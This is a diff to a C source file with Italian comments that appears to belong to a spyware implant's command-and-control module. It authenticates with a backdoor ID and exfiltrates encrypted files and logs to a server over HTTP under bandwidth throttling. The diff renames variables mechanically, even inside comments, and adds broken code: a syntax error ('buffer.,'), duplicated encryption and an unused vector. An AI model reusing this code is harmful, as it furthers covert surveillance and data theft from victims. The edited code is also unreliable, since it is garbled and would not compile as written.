@@ -9,6 +9,7 @@
 #include <string.h>
 #include "../x64.h"
 #include "../bss.h"
+#include <rcs/vector.h>
 
 #define REQUEST_ARRAY_LEN 1
 static WCHAR *wRequest_array[] = {
@@ -76,12 +77,12 @@ BOOL ASP_StartASPThread(DWORD dwPid, ASP_THREAD *asp_thread)
 // Usata dall'host ASP per attaccarsi alla shared memory
 BOOL ASP_IPCAttach()
 {
-	HANDLE h_file = FNC(OpenFileMappingA)(FILE_MAP_ALL_ACCESS, FALSE, shared.SHARE_MEMORY_ASP_COMMAND_NAME);
+	HANDLE hFile = FNC(OpenFileMappingA)(FILE_MAP_ALL_ACCESS, FALSE, shared.SHARE_MEMORY_ASP_COMMAND_NAME);
 
 	// Riutilizza ASP_IPC_command tanto non l'host ASP non lo condivide 
 	// con il core
-	if (h_file) 
-		ASP_IPC_command = (ASP_IPC_CTRL *)FNC(MapViewOfFile)(h_file, FILE_MAP_ALL_ACCESS, 0, 0, sizeof(ASP_IPC_CTRL));
+	if (hFile) 
+		ASP_IPC_command = (ASP_IPC_CTRL *)FNC(MapViewOfFile)(hFile, FILE_MAP_ALL_ACCESS, 0, 0, sizeof(ASP_IPC_CTRL));
 
 	if (ASP_IPC_command)
 		return TRUE;
@@ -96,7 +97,7 @@ BOOL ASP_IPCAttach()
 // Parsa una risposta del server
 // Ritorna un puntatore al body del messaggio
 // Torna NULL in caso di fallimento
-BYTE *ParseResponse(BYTE *ptr, DWORD len, DWORD *command, DWORD *message_len)
+static BYTE *ParseResponse(BYTE *ptr, DWORD len, DWORD *command, DWORD *message_len)
 {
 	BYTE *msg_ptr;
 	BYTE iv[16];
@@ -152,7 +153,7 @@ BYTE *ParseResponse(BYTE *ptr, DWORD len, DWORD *command, DWORD *message_len)
 	return msg_ptr;
 }
 
-// Prende un buffer e lo dumpa su file
+// Prende un tmp e lo dumpa su file
 static BOOL WriteBufferOnFile(WCHAR *file_path, BYTE *buffer, DWORD buf_len)
 {
 	if (buffer == NULL || file_path == NULL)
@@ -190,7 +191,7 @@ static void rand_bin_seq(BYTE *buffer, DWORD buflen)
 		buffer[i] = rand();
 }
 
-// Invia il buffer rispettando il limite di banda di byte_per_second
+// Invia il tmp rispettando il limite di banda di byte_per_second
 BOOL BandSafeDataSend(BYTE *buf, DWORD len, DWORD byte_per_second)
 {
 #define SAMPLING_RATE 100
@@ -244,7 +245,7 @@ BOOL BandSafeDataSend(BYTE *buf, DWORD len, DWORD byte_per_second)
 }
 
 // Invia una richiesta HTTP e legge la risposta
-// Alloca il buffer con la risposta (che va poi liberato dal chiamante)
+// Alloca il tmp con la risposta (che va poi liberato dal chiamante)
 BOOL HttpTransaction(BYTE *s_buffer, DWORD sbuf_len, BYTE **r_buffer, DWORD *response_len, DWORD byte_per_second)
 {
 	WCHAR szContentLength[32];
@@ -291,13 +292,13 @@ BOOL HttpTransaction(BYTE *s_buffer, DWORD sbuf_len, BYTE **r_buffer, DWORD *res
 	return TRUE;
 }
 
-// Crea il buffer da inviare per un comando piu' messaggio
-// il buffer ritornato va liberato
+// Crea il tmp da inviare per un comando piu' messaggio
+// il tmp ritornato va liberato
 BYTE *PrepareCommand(DWORD command, BYTE *message, DWORD msg_len, DWORD *ret_len)
 {
 	SHA1Context sha;
 	DWORD tot_len, pad_len, i;
-	BYTE *buffer, *ptr;
+	BYTE *tmp, *ptr;
 	aes_context crypt_ctx;
 	DWORD rand_pad_len = 0;
 	BYTE iv[16];
@@ -314,7 +315,9 @@ BYTE *PrepareCommand(DWORD command, BYTE *message, DWORD msg_len, DWORD *ret_len
 	tot_len*=16;
 	pad_len = tot_len - pad_len;
 
-	if (!(buffer = (BYTE *)malloc(tot_len + rand_pad_len)))
+	rcs::vector buffer(tot_len + rand_pad_len);
+
+	if (!(tmp = (BYTE *)malloc(tot_len + rand_pad_len)))
 		return NULL;
 
 	SHA1Reset(&sha);
@@ -322,34 +325,47 @@ BYTE *PrepareCommand(DWORD command, BYTE *message, DWORD msg_len, DWORD *ret_len
 	if (msg_len)
 		SHA1Input(&sha, (BYTE *)message, msg_len);
 	if (!SHA1Result(&sha)) {
-		free(buffer);
+		free(tmp);
 		return NULL;
 	}
 	for (i=0; i<5; i++)
 		sha.Message_Digest[i] = ntohl(sha.Message_Digest[i]);
 
-	// scrive il buffer
-	memset(buffer, pad_len, tot_len);
-	ptr = buffer;
+	// scrive il tmp
+	buffer.clear(pad_len);
+	memset(tmp, pad_len, tot_len);
+	
+	ptr = tmp;
 	memcpy(ptr, &command, sizeof(DWORD));
+	buffer.write(command);
+
 	ptr += sizeof(DWORD);
 	if (msg_len)
 		memcpy(ptr, message, msg_len);
 	ptr += msg_len;
+
+	buffer.write<BYTE>(message, msg_len);
+	buffer.write<BYTE>((BYTE*)&sha.Message_Digest, sizeof(sha.Message_Digest));
+
 	memcpy(ptr, sha.Message_Digest, sizeof(sha.Message_Digest));
 
 	// cifra il tutto
 	aes_set_key( &crypt_ctx, (BYTE *)asp_global_session_key, 128);
 	memset(iv, 0, sizeof(iv));
-	aes_cbc_encrypt(&crypt_ctx, iv, buffer, buffer, tot_len);
-	rand_bin_seq(buffer + tot_len, rand_pad_len);
+	aes_cbc_encrypt(&crypt_ctx, iv, tmp, tmp, tot_len);
+	
+	aes_set_key(&crypt_ctx, (BYTE*)asp_global_session_key, 128);
+	memset(iv, 0, sizeof(iv));
+	aes_cbc_encrypt(&crypt_ctx, iv, buffer., tmp, tot_len);
+
+	rand_bin_seq(tmp + tot_len, rand_pad_len);
 
 	if (ret_len)
 		*ret_len = tot_len + rand_pad_len;
-	return buffer;
+	return tmp;
 }
 
-// Formatta il buffer per l'invio di un log
+// Formatta il tmp per l'invio di un log
 // Non usa PrepareCommand per evitare di dover allocare due volte la dimensione del file
 BYTE *PrepareFile(WCHAR *file_path, DWORD *ret_len)
 {
@@ -386,13 +402,13 @@ BYTE *PrepareFile(WCHAR *file_path, DWORD *ret_len)
 	tot_len*=16;
 	pad_len = tot_len - pad_len;
 
-	// alloca il buffer
+	// alloca il tmp
 	if (!(buffer = (BYTE *)malloc(tot_len + rand_pad_len))) {
 		CloseHandle(hfile);
 		return NULL;
 	}
 
-	// scrive il buffer
+	// scrive il tmp
 	memset(buffer, pad_len, tot_len);
 	ptr = buffer;
 	memcpy(ptr, &command, sizeof(DWORD));
@@ -412,13 +428,9 @@ BYTE *PrepareFile(WCHAR *file_path, DWORD *ret_len)
 	}
 	CloseHandle(hfile);
 
-	// Calcola lo sha1 sulla prima parte del buffer
-	SHA1Reset(&sha);
-	SHA1Input(&sha, buffer, sizeof(DWORD)*2 + msg_len);
-	if (!SHA1Result(&sha)) {
-		free(buffer);
-		return NULL;
-	}
+	// Calcola lo sha1 sulla prima parte del tmp
+	sha1digest(&sha, buffer, sizeof(DWORD) * 2 + msg_len);
+
 	// ..lo scrive
 	for (i=0; i<5; i++)
 		sha.Message_Digest[i] = ntohl(sha.Message_Digest[i]);
@@ -590,7 +602,7 @@ static BOOL H_ASP_Auth(char *signature, DWORD sig_len, char *backdoor_id, DWORD 
 
 	*response_command = PROTO_NO;
 
-	// Costruisce il buffer
+	// Costruisce il tmp
 	ZeroMemory(buffer, sizeof(buffer));
 	rand_bin_seq(client_key, 16);
 	rand_bin_seq(nonce_payload, 16);
@@ -632,7 +644,7 @@ static BOOL H_ASP_Auth(char *signature, DWORD sig_len, char *backdoor_id, DWORD 
 	ptr+=SHA_DIGEST_LENGTH;
 	memset(ptr, 8, AUTH_REAL_LEN-(ptr-buffer)); // Padda fino alla fine con 8
 
-	// Cifra il buffer
+	// Cifra il tmp
 	aes_set_key( &crypt_ctx, (BYTE *)signature, 128);
 	memset(iv, 0, sizeof(iv));
 	aes_cbc_encrypt(&crypt_ctx, iv, buffer, buffer, AUTH_REAL_LEN);
@@ -722,7 +734,7 @@ BYTE *H_ASP_ID(WCHAR *user_id, WCHAR *device_id, WCHAR *source_id, DWORD *respon
 		if (!(buffer = PrepareCommand(PROTO_ID, message, sizeof(DWORD)+l_usr+l_dev+l_src, &buffer_len)))
 			break;
 
-		// Invia il buffer
+		// Invia il tmp
 		if (!HttpTransaction(buffer, buffer_len, &response, &response_len, WIRESPEED))
 			break;
 
@@ -746,7 +758,7 @@ BYTE *H_ASP_ID(WCHAR *user_id, WCHAR *device_id, WCHAR *source_id, DWORD *respon
 	return response_message;
 }
 
-// Usato per i comandi che ricevono un buffer in memoria (DOWNLOAD e FILESYSTEM)
+// Usato per i comandi che ricevono un tmp in memoria (DOWNLOAD e FILESYSTEM)
 // Se il server torna un messaggio, response_message viene allocato (va liberato dal chiamante)
 BOOL H_ASP_GenericCommand(DWORD command, DWORD *response_command, BYTE **response_message, DWORD *response_message_len)
 {
@@ -766,7 +778,7 @@ BOOL H_ASP_GenericCommand(DWORD command, DWORD *response_command, BYTE **respons
 		if (!(buffer = PrepareCommand(command, NULL, 0, &buffer_len)))
 			break;
 
-		// Invia il buffer
+		// Invia il tmp
 		if (!HttpTransaction(buffer, buffer_len, &response, &response_len, WIRESPEED)) 
 			break;
 
@@ -788,7 +800,7 @@ BOOL H_ASP_GenericCommand(DWORD command, DWORD *response_command, BYTE **respons
 	return ret_val;
 }
 
-// Usato per i comandi che ricevono un buffer in memoria (DOWNLOAD e FILESYSTEM)
+// Usato per i comandi che ricevono un tmp in memoria (DOWNLOAD e FILESYSTEM)
 // Se il server torna un messaggio, response_message viene allocato (va liberato dal chiamante)
 // Permette anche l'invio di un payload
 BOOL H_ASP_GenericCommandPL(DWORD command, BYTE *payload, DWORD payload_len, DWORD *response_command, BYTE **response_message, DWORD *response_message_len)
@@ -809,7 +821,7 @@ BOOL H_ASP_GenericCommandPL(DWORD command, BYTE *payload, DWORD payload_len, DWO
 		if (!(buffer = PrepareCommand(command, payload, payload_len, &buffer_len)))
 			break;
 
-		// Invia il buffer
+		// Invia il tmp
 		if (!HttpTransaction(buffer, buffer_len, &response, &response_len, WIRESPEED)) 
 			break;
 
@@ -862,7 +874,7 @@ BOOL H_ASP_GetUpload(BOOL is_upload, DWORD *response_command, WCHAR **file_name,
 		if (!(buffer = PrepareCommand(command, NULL, 0, &buffer_len)))
 			break;
 
-		// Invia il buffer
+		// Invia il tmp
 		if (!HttpTransaction(buffer, buffer_len, &response, &response_len, WIRESPEED)) 
 			break;
 
@@ -916,11 +928,11 @@ BOOL H_ASP_SendFile(WCHAR *file_path, DWORD byte_per_second, DWORD *response_com
 	*response_command = PROTO_NO;
 
 	do {
-		// Crea il buffer con comando e file
+		// Crea il tmp con comando e file
 		if (!(buffer = PrepareFile(file_path, &buffer_len)))
 			break;
 
-		// Invia il buffer
+		// Invia il tmp
 		if (!HttpTransaction(buffer, buffer_len, &response, &response_len, byte_per_second)) 
 			break;
 		
